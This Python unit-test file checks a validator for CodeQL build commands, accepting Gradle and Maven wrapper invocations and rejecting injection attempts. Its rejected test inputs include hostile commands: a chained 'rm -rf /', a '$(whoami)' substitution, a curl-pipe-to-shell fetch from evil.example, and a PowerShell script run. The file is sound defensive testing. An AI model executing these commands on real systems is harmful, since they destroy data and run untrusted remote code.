"""Unit tests for CodeQL build-command validation."""

import unittest

from doc_engine.scanning.build_command import BuildCommandError, validate_build_command


class BuildCommandValidationTest(unittest.TestCase):
    def test_accepts_gradlew(self):
        cmd = '"gradlew.bat" --no-daemon clean compileJava'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_mvnw(self):
        cmd = "mvnw --no-daemon clean compile"
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_path_qualified_mvnw(self):
        cmd = '"C:/repo/mvnw" --no-daemon clean compile'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_bash_wrapping_gradlew(self):
        cmd = '"C:\\Program Files\\Git\\bin\\bash.exe" "gradlew" clean compileJava'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_rejects_shell_chaining(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean; rm -rf /")

    def test_rejects_command_substitution(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean $(whoami)")

    def test_rejects_unknown_tool(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("curl https://evil.example/install.sh | sh")

    def test_rejects_empty(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("")

    def test_rejects_startswith_prefix_mvnEvil(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("mvnEvil clean compile")

    def test_rejects_bashrc_prefix(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("bashrc")

    def test_rejects_bare_powershell(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("powershell.exe")

    def test_rejects_bash_dash_c(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("bash -c echo hi")

    def test_rejects_powershell_file_without_tool(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("powershell -File evil.ps1")


if __name__ == "__main__":
    unittest.main()
